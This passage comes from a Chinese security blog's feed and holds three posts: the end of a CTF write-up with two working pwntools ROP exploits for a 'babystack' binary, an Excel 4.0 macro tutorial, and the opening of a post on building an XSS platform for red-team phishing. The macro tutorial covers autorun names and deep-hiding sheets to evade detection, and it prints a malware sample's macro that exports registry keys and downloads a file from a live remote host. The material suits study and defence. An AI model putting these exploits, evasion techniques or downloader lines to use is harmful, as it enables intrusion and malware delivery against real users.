class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">ascotbe@ubuntu:~/Desktop/PWN$ ROPgadget --binary babystack --only <span class="string">&quot;pop|ret&quot;</span></span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x0000000000400bfc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400bfe : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400c00 : pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400c02 : pop r15 ; ret</span><br><span class="line">0x0000000000400bfb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400bff : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400870 : pop rbp ; ret</span><br><span class="line">0x0000000000400c03 : pop rdi ; ret</span><br><span class="line">0x0000000000400c01 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x0000000000400bfd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400791 : ret</span><br><span class="line">0x000000000040028b : ret 0x2800</span><br><span class="line">0x000000000040097e : ret 0x8b48</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 13</span><br></pre></td></tr></table></figure><p>主要就是覆盖TLS中的cancry值，然后加上ret2libc3题目的操作即可</p><div class="note warning modern"><p>下面两个POC都能跑，但是没搞懂如何计算出来的TLS长度为6218的。。。。</p></div><p>POC1</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> context.quiet:</span><br><span class="line">    p = process(<span class="string">&#x27;./babystack&#x27;</span>, env = &#123;<span class="string">&#x27;LD_PRELOAD&#x27;</span>: <span class="string">&#x27;./libc-2.23.so&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;How many bytes do you want to send?\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">0x1010</span> + <span class="number">2008</span> + <span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># puts(atol@GOT) to leak a libc address</span></span><br><span class="line">    payload  = p64(<span class="number">0x400c03</span>) <span class="comment"># pop rdi; ret;</span></span><br><span class="line">    payload += p64(<span class="number">0x601ff0</span>) <span class="comment"># rdi &lt;= atol@GOT</span></span><br><span class="line">    payload += p64(<span class="number">0x4007c0</span>) <span class="comment"># jmp puts@PLT</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># read(0, 0x602030, SIZE) to write the final payload somewhere in .bss</span></span><br><span class="line">    <span class="comment"># luckily, there is a large value in rdx, so we don&#x27;t need to provide it here</span></span><br><span class="line">    payload += p64(<span class="number">0x400c03</span>) <span class="comment"># pop rdi; ret;</span></span><br><span class="line">    payload += p64(<span class="number">0</span>)        <span class="comment"># rdi &lt;= stdin</span></span><br><span class="line">    payload += p64(<span class="number">0x400c01</span>) <span class="comment"># pop rsi; pop r15; ret;</span></span><br><span class="line">    payload += p64(<span class="number">0x602030</span>) <span class="comment"># rsi &lt;= 0x602030 (somewhere in .bss)</span></span><br><span class="line">    payload += p64(<span class="number">0</span>)        <span class="comment"># r15 &lt;= garbage</span></span><br><span class="line">    payload += p64(<span class="number">0x4007e0</span>) <span class="comment"># jmp read@PLT</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># pivot rsp into somewhere in .bss</span></span><br><span class="line">    payload += p64(<span class="number">0x400bfd</span>) <span class="comment"># pop rsp; pop r13; pop r14; pop r15; ret</span></span><br><span class="line">    payload += p64(<span class="number">0x602030</span>) <span class="comment"># rsp &lt;= 0x602030 (somewhere in .bss)</span></span><br><span class="line"></span><br><span class="line">    p.send(</span><br><span class="line">        <span class="comment"># garbage to fill out the buffer up to canary</span></span><br><span class="line">        <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x1010</span> - <span class="number">8</span>) + \</span><br><span class="line">        <span class="comment"># fake canary</span></span><br><span class="line">        <span class="string">&#x27;b&#x27;</span> * <span class="number">8</span> + \</span><br><span class="line">        <span class="comment"># saved rbp</span></span><br><span class="line">        <span class="string">&#x27;c&#x27;</span> * <span class="number">8</span> + \</span><br><span class="line">        <span class="comment"># return address + ROP chain</span></span><br><span class="line">        payload + \</span><br><span class="line">        <span class="comment"># garbage</span></span><br><span class="line">        <span class="string">&#x27;d&#x27;</span> * (<span class="number">2000</span> - <span class="built_in">len</span>(payload)) + \</span><br><span class="line">        <span class="comment"># replace thread&#x27;s stack guard with our fake canary</span></span><br><span class="line">        <span class="string">&#x27;b&#x27;</span> * <span class="number">8</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="comment"># here the content of atol@GOT is printed</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;It&#x27;s time to say goodbye.\n&quot;</span>)</span><br><span class="line">    libc_base = u64(p.recv(<span class="number">6</span>) + <span class="string">&#x27;\x00\x00&#x27;</span>) - <span class="number">0x36ea0</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;libc base: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x4526aexecve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">    constraints:</span></span><br><span class="line"><span class="string">        [rsp+0x30] == NULL</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    one_gadget = libc_base + <span class="number">0x4526a</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;one gadget: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(one_gadget))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># here we provide the final payload for exploitation</span></span><br><span class="line">    <span class="comment"># since rsp is pivoted, we provide the rest of data here</span></span><br><span class="line">    p.sendline(</span><br><span class="line">        <span class="comment"># pop r13; pop r14; pop r15; ret</span></span><br><span class="line">        <span class="comment"># writing garbage to r13, r14, and r15</span></span><br><span class="line">        p64(<span class="number">0</span>) * <span class="number">3</span> + \</span><br><span class="line">        <span class="comment"># after above ret, the shell will be executed</span></span><br><span class="line">        p64(one_gadget) + \</span><br><span class="line">        <span class="comment"># write enough zeros in order to satify [rsp+0x30] == NULL constraint</span></span><br><span class="line">        <span class="string">&#x27;\x00&#x27;</span> * <span class="number">0x40</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>POC2</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span>(<span class="params"><span class="built_in">bytes</span>,data</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;How many bytes do you want to send?\n&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="built_in">bytes</span>))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    io.send(data)</span><br><span class="line"></span><br><span class="line">puts_plt = <span class="number">0x4007C0</span></span><br><span class="line">read_plt = <span class="number">0x4007E0</span> </span><br><span class="line">leave_addr = <span class="number">0x400A9B</span></span><br><span class="line"></span><br><span class="line">pop_rdi_addr = <span class="number">0x400c03</span></span><br><span class="line">puts_got = <span class="number">0x601FB0</span></span><br><span class="line">pop_rbp_addr = <span class="number">0x400870</span></span><br><span class="line">pop_rsi_addr = <span class="number">0x400c01</span></span><br><span class="line"></span><br><span class="line">bss_addr = <span class="number">0x602030</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./bs&#x27;</span>,env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : <span class="string">&quot;./libc-2.23.so&quot;</span>&#125;)</span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">payload = <span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x1010</span>+p64(bss_addr-<span class="number">0x8</span>)+p64(pop_rdi_addr) + p64(puts_got) + p64(puts_plt)</span><br><span class="line">payload += p64(pop_rdi_addr) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rsi_addr) + p64(bss_addr) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(read_plt) + p64(leave_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x2000</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">menu(<span class="number">0x2000</span>,payload)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;It\&#x27;s time to say goodbye.\n&#x27;</span>)</span><br><span class="line">base = u64(io.recv(<span class="number">6</span>)+<span class="string">&#x27;\x00\x00&#x27;</span>)-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">io.send(p64(base+<span class="number">0xf1147</span>))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">《ctf竞赛权威指南（PWN篇）》</span><br><span class="line">https:&#x2F;&#x2F;ctf-wiki.org&#x2F;pwn&#x2F;linux&#x2F;mitigation&#x2F;canary&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;www.jianshu.com&#x2F;p&#x2F;b0b254b94afe</span><br><span class="line">http:&#x2F;&#x2F;6par.top&#x2F;2020&#x2F;07&#x2F;05&#x2F;%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;www.int0x80.top&#x2F;BypassCanary&#x2F;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Office Excel Macro</title>
    <link href="https://www.ascotbe.com/2021/01/27/OfficeExcelMacro/"/>
    <id>https://www.ascotbe.com/2021/01/27/OfficeExcelMacro/</id>
    <published>2021-01-27T10:45:42.000Z</published>
    <updated>2021-07-05T01:51:27.657Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>声明</p></blockquote><p>郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</p><blockquote><p>前言</p></blockquote><p>好久没笼统的学习了，梳理下Excel宏相关的东西以防下次要用的时候都不会。</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/OfficeExcelMacro/1.png" alt="image-20210128134158060"></p><h3 id="关于宏"><a href="#关于宏" class="headerlink" title="关于宏"></a>关于宏</h3><p>据我所知微软office所支持的宏里面，目前有两种</p><ul><li>1992年：微软在office中引用了名为Excel4.0的宏代码技术，也被成为XLM宏。Excel4.0宏代码写在表格中，宏代码的具体文件呈现为xml而不是二进制文件。</li><li>1993年：微软更新了Excel5.0技术，也就是现在常见的VBA宏代码。</li></ul><p>从Excel2010到Excel2019全线产品都支持Excel4.0宏。同时微软也提到，虽然目前Microsoft Excel仍然支持Excel4.0宏，但还是建议用户使用VBA宏。</p><h3 id="Macro-4-0"><a href="#Macro-4-0" class="headerlink" title="Macro 4.0"></a>Macro 4.0</h3><h4 id="简单利用"><a href="#简单利用" class="headerlink" title="简单利用"></a>简单利用</h4><p>在箭头位置点击右键-&gt;插入即可使用</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/OfficeExcelMacro/2.png" alt="image-20210126164024520"></p><p>接着会出现一个新建的宏表格，我们在表格中添加如下命令，即可完成一个简单的宏</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;EXEC(&quot;calc.exe&quot;)</span><br><span class="line">&#x3D;ALERT(&quot;hello ascotbe~&quot;)</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/OfficeExcelMacro/3.gif" alt="1"></p><h4 id="隐蔽性"><a href="#隐蔽性" class="headerlink" title="隐蔽性"></a>隐蔽性</h4><p>可以见到使用XLM宏比常见的VBA宏具有更好的免杀性，主要原因XLM宏和VBA宏的设计理念不同，导致了宏代码在文件结构中的呈现不同，和VBA宏一样的是，在文件打开时，Excel依旧会提醒用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Because of your security settings, macros have been disabled. To run macros, you need to reopen this workbook, and then choose to enable macros. For more information about enabling macros, click Help.</span><br></pre></td></tr></table></figure><p>不同的是，当用户单击启用之后，ALT + F11打开宏代码窗口，却并不能看到宏代码。也不能通过一些常见的宏代码提取工具检测分析宏。</p><p>这是因为默认情况下，XLM宏代码存储在<code>ascotbe.xlsm\xl\Macrosheets\Sheet1.xml</code>。打开该xml文件，可以清晰的看到刚才在Excel工作表中插入的宏代码。</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/OfficeExcelMacro/4.png" alt="image-20210126173824786"></p><h4 id="自动加载"><a href="#自动加载" class="headerlink" title="自动加载"></a>自动加载</h4><ul><li>Auto_Open：在用户打开文档的时候自动运行（如果用户允许执行宏代码）</li><li>Auto_Close：在用户关闭文档的时候自动运行（如果用户允许执行宏代码）</li></ul><p>XLM宏只需要将需要执行宏的单元格名称设置为Auto_Open或Auto_Close即可实现宏代码的自动加载。</p><h5 id="设置单元格名称"><a href="#设置单元格名称" class="headerlink" title="设置单元格名称"></a>设置单元格名称</h5><p>点击一个单元格，然后选着公式-&gt;定义的名称-&gt;定义名称即可设置成功</p><h5 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h5><p>没有设置Auto_Close关闭文档，可以看到无任何反应，当我们设置了以后关闭，弹出了计算器和弹窗</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/OfficeExcelMacro/5.gif" alt="2"></p><h4 id="隐藏方式"><a href="#隐藏方式" class="headerlink" title="隐藏方式"></a>隐藏方式</h4><h5 id="简单的隐藏"><a href="#简单的隐藏" class="headerlink" title="简单的隐藏"></a>简单的隐藏</h5><p>左下角隐藏，可以通过右键-&gt;取消隐藏来显示</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/OfficeExcelMacro/6.png" alt="image-20210127104310071"></p><p>列隐藏，可以看到正常都是从A1开始的表格，隐藏了列以后变成了从D1开始了，并且进度条是拉倒最左边的</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/OfficeExcelMacro/7.png" alt="image-20210127104449564"></p><h5 id="进制隐藏"><a href="#进制隐藏" class="headerlink" title="进制隐藏"></a>进制隐藏</h5><p>这种隐藏方式如果使用<code>xlsm</code>后缀格式的话是无法利用的，但是xls格式是可以的，通过全局搜索字符串<code>sheet1</code>找到后面十六进制是<strong>85 00</strong>开头的位置，然后往后数九个字节，可以看到框起来的最后一个字节是01</p><ul><li>00:表示不隐藏</li><li>01:表示浅隐藏（可通过鼠标右键取消隐藏）</li><li>02:表示深度隐藏（无法在Excel中找到）</li></ul><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/OfficeExcelMacro/8.png" alt="image-20210127181124488"></p><p>具体效果可以看图</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/OfficeExcelMacro/9.gif" alt="3"></p><h4 id="一个案例"><a href="#一个案例" class="headerlink" title="一个案例"></a>一个案例</h4><p>样本下载地址<a href="https://app.any.run/tasks/aaf8a9aa-5068-42dd-89cf-cd610ce5e730/">点我</a>，备份地址<a href="https://raw.staticdn.net/Ascotbe/Random-img/master/OfficeExcelMacro/Info_695.xls.zip">下载</a>，下面是样本的截图</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/OfficeExcelMacro/10.png" alt="img"></p><h5 id="如何定位该样本的隐藏宏位置"><a href="#如何定位该样本的隐藏宏位置" class="headerlink" title="如何定位该样本的隐藏宏位置"></a>如何定位该样本的隐藏宏位置</h5><p>下载项目</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;DidierStevens&#x2F;DidierStevensSuite</span><br></pre></td></tr></table></figure><p>然后执行以下命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python oledump.py -p plugin_biff.py --pluginoptions &quot;-o BOUNDSHEET -a&quot; &#x2F;Users&#x2F;ascotbe&#x2F;Downloads&#x2F;Info_695.xls</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/OfficeExcelMacro/12.png" alt="image-20210308143858216"></p><p>可以看到定位到了宏的位置<strong>D0 66 02 00 02 01 0A 00</strong>，只需要修改第5个字节位置的02即可打开深度隐藏宏</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/OfficeExcelMacro/13.png" alt="image-20210308144106093"></p><h5 id="样本分析"><a href="#样本分析" class="headerlink" title="样本分析"></a>样本分析</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;IF(GET.WORKSPACE(19),,CLOSE(TRUE))#检查是否存在鼠标，如果GET.WORKSPACE获取的值为false的话，就执行CLOSE保存关闭表格。if函数第二个参数是判断第一个参数返回值为ture执行位置，第三个参数是判断第一个参数返回值为false执行位置</span><br><span class="line">&#x3D;IF(GET.WORKSPACE(42),,CLOSE(TRUE))#计算机是否能够播放声音</span><br><span class="line">&#x3D;IF(ISNUMBER(SEARCH(&quot;Windows&quot;,GET.WORKSPACE(1))), ,CLOSE(TRUE))#检查运行Microsoft Excel的环境，然后检查环境的版本号</span><br></pre></td></tr></table></figure><p>如果这三个是正确的，则将Excel安全注册表项复制到<strong>C:\Users\public\1.reg</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;CALL(&quot;Shell32&quot;,&quot;ShellExecuteA&quot;,&quot;JJCCCJJ&quot;,0,&quot;open&quot;,&quot;C:\Windows\system32\reg.exe&quot;,&quot;EXPORT HKCU\Software\Microsoft\Office\&quot;&amp;GET.WORKSPACE(2)&amp;&quot;\Excel\Security c:\users\public\1.reg &#x2F;y&quot;,0,5)</span><br></pre></td></tr></table></figure><p>接下来，它等待三秒钟。然后它打开1.reg，从字节位置215开始，并读取接下来的255个字节</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;WAIT(NOW()+&quot;00:00:03&quot;)</span><br><span class="line">&#x3D;FOPEN(&quot;c:\users\public\1.reg&quot;)</span><br><span class="line">&#x3D;FPOS(Q10, 215)</span><br><span class="line">&#x3D;FREAD(Q10, 255)</span><br></pre></td></tr></table></figure><p>提取出来的<a href="https://app.any.run/tasks/aaf8a9aa-5068-42dd-89cf-cd610ce5e730/">1.reg</a>内容</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/OfficeExcelMacro/11.png" alt="image-20210308180750093"></p><p>1.reg被关闭并删除。然后它在读取的内容（存储在单元格Q12中）中搜索字符串“ 0001”。这是第二次测试，看它是否在沙箱中。如果找到该字符串，它将关闭电子表格。如果找不到字符串“ 0001”，它将尝试下载文件并将其另存为.html文件在**C:\Users\Public\**中。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;FCLOSE(Q10)</span><br><span class="line">&#x3D;FILE.DELETE(&quot;c:\users\public\1.reg&quot;)</span><br><span class="line">&#x3D;IF(ISNUMBER(SEARCH(&quot;0001&quot;,Q12)),CLOSE(FALSE),)</span><br><span class="line">&#x3D;CALL(&quot;urlmon&quot;,&quot;URLDownloadToFileA&quot;,&quot;JJCCJJ&quot;,0,&quot;https:&#x2F;&#x2F;efbzfyvsb.website&#x2F;f2f23&quot;,&quot;c:\Users\Public\b7gf5yk.html&quot;,0,0)</span><br></pre></td></tr></table></figure><p>完整的英文语法文档<a href="https://raw.staticdn.net/Ascotbe/Random-img/master/OfficeExcelMacro/Excel4.0MacroFunctionsReference.pdf">下载</a>，中文版<a href="https://raw.staticdn.net/Ascotbe/Random-img/master/OfficeExcelMacro/MacrofunCn.hlp">下载</a>，一个在线的Excel xml宏函数<a href="http://www.cpearson.com/excel/call.htm">文档</a>里面比官网文档全面</p><p>关于注册表reg文件的解释参考这篇<a href="https://www.cnblogs.com/fczjuever/archive/2013/04/09/3010711.html">博客</a></p><p>最后贴上代码转ASCII代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="string">&quot;&quot;&quot;xxx&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="comment">#print(ord(i))</span></span><br><span class="line">    print(<span class="string">&quot;=CHAR(&quot;</span>+<span class="built_in">str</span>(<span class="built_in">ord</span>(i))+<span class="string">&quot;)&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="Macro-5-0"><a href="#Macro-5-0" class="headerlink" title="Macro 5.0"></a>Macro 5.0</h3><p>关于VBA宏的制作这里就不概述了，可以参考之前的<a href="https://www.ascotbe.com/2020/07/26/office_0x01/#Office%E5%AE%8F">文章</a>，可以看到word和excel的vba宏是通用的</p><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;clickallthethings.wordpress.com&#x2F;2020&#x2F;04&#x2F;06&#x2F;covid-19-excel-4-0-macros-and-sandbox-detection&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;www.yuque.com&#x2F;p1ut0&#x2F;qtmgyx&#x2F;rqank4</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    
  </entry>
  
  <entry>
    <title>从零开始编写XSS平台</title>
    <link href="https://www.ascotbe.com/2021/01/08/CrossSiteScripting/"/>
    <id>https://www.ascotbe.com/2021/01/08/CrossSiteScripting/</id>
    <published>2021-01-08T10:45:42.000Z</published>
    <updated>2021-05-17T00:32:35.016Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>声明</p></blockquote><p>郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</p><blockquote><p>前言</p></blockquote><p>在我们日常渗透或者红队打点的时候都或多或少的会挖掘到XSS漏洞，由于红队钓鱼也经常用到XSS平台，虽然网上免费可以注册的平台很多，但是这些平台都是别人的首先钓鱼到的数据并不是只有你一个人可见，网站的管理员也可以看的到，这就会对某些敏感的红队项目的信息造成泄漏，其次网站也经常不稳定，尝尝十天半个月就要换一个平台重新来一次，所以这篇文章就来了~</p><ul><li>项目地址：<a href="https://github.com/Ascotbe/Medusa">https://github.com/Ascotbe/Medusa</a></li></ul><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/CrossSiteScripting/1.gif" alt="938393FBC8A524B353CE58DCC17095F4" style="zoom:50%;" /><h2 id="什么是XSS"><a href="#什么是XSS" class="headerlink" title="什么是XSS"></a>什么是XSS</h2><p><strong>跨站脚本</strong>（英语：Cross-site scripting，通常简称为：XSS）是一种网站应用程序的安全漏洞攻击，是代码注入的一种。它允许恶意用户将代码注入到网页上，其他用户在观看网页时就会受到影响。这类攻击通常包含了HTML以及用户端脚本语言。</p><p>Cross-site scripting的英文首字母缩写本应为<strong>CSS</strong>，但因为CSS在网页设计领域已经被广泛指层叠样式表（Cascading Style Sheets），所以将Cross（意为“交叉”）改以交叉形的<strong>X</strong>做为缩写。</p><p><strong>XSS</strong>攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java，VBScript，ActiveX，Flash或者甚至是普通的HTML。攻击成功后，攻击者可能得到更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容。</p><h2 id="框架选用"><a href="#框架选用" class="headerlink" title="框架选用"></a>框架选用</h2><h3 id="什么是Django"><a href="#什么是Django" class="headerlink" title="什么是Django"></a>什么是Django</h3><p><strong>Django</strong>是一个开放源代码的Web应用框架，由Python写成。采用了MVT的软件设计模式，即模型（Model），视图（View）和模板（Template）。它在开发初期用于管理劳伦斯出版集团旗下的一些以新闻为主的网站。Django于2005年7月在BSD许可证下发布，它的名字来源于比利时的吉普赛爵士吉他手Django Reinhardt。</p><p>Django的主要目标是简化数据库驱动的网站的开发。Django注重组件的重用性和“可插拔性”，敏捷开发和DRY法则（Don’t Repeat Yourself）。在Django中普遍使用的语言是Python，甚至包括配置文件和数据模型。</p><h3 id="为什么不用Flask"><a href="#为什么不用Flask" class="headerlink" title="为什么不用Flask"></a>为什么不用Flask</h3><blockquote><p>Flask 怎么定位自己的？</p></blockquote><p>将自己定位为微框架。<strong>啥叫微框架，就是毛坯房的意思。给你个毛胚房，你自己装修去。</strong></p><ul><li><p><strong>表单怎么解决？</strong>从社区找了个 Flask-Form</p></li><li><p><strong>跨站攻击？</strong> 社区 Flask-Form 帮你做了。</p></li><li><p><strong>登陆认证鉴权怎么搞定？</strong> 自己写 User 模块。</p></li><li><p><strong>ORM 怎么挑选？</strong>flask-sqlalchemy 自己组装一下。等等 SQLAlchemy 是什么玩意？ query 语法写起来怎么这么原始…</p></li><li><p><strong>DBMigration 怎么做？</strong> Alembic 配合 SQLAlchemy, 等等，SQLAlchemy?? Alembic</p></li><li><p><strong>缓存怎么做？</strong> 自己手动封装一下 RedisPy</p></li></ul><blockquote><p>Django 怎么定位标榜自己的？</p></blockquote><p>划重点 The web framework for perfectionists with deadlines. <strong>完美主义者的 Deadline 终结框架</strong></p><p>定位不同，就会导致设计上和功能上的倾向性。</p><ul><li><p><strong>表单怎么解决？</strong> Django Form 很好用呀。</p></li><li><p><strong>跨站攻击？</strong> Django 帮你做了 csrftoken</p></li><li><p><strong>登陆认证鉴权怎么搞定？</strong> Django 自带了 backend 和 auth 模块。</p></li><li><p><strong>ORM 怎么挑选？</strong>Django ORM 很好用。</p></li><li><p><strong>DBMigration 怎么做？</strong> Django Migration 